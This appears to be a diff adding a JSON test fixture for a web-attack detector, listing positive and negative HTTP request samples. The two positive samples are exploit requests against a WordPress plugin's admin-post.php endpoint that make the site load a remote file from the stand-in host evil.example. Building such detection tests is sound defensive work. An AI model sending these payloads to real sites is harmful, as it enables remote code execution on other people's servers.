@@ -1,0 +1,30 @@
+{
+  "positive": [
+    {
+      "name": "public exploit",
+      "method": "GET",
+      "path": "/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://evil.example/p.txt"
+    },
+    {
+      "name": "POST form",
+      "method": "POST",
+      "path": "/wp-admin/admin-post.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "swp_debug=load_options&swp_url=http://evil.example/p.txt"
+    }
+  ],
+  "negative": [
+    {
+      "name": "share button request",
+      "method": "GET",
+      "path": "/blog/post/?utm_source=twitter"
+    },
+    {
+      "name": "admin post",
+      "method": "POST",
+      "path": "/wp-admin/admin-post.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "action=swp_save"
+    }
+  ]
+}
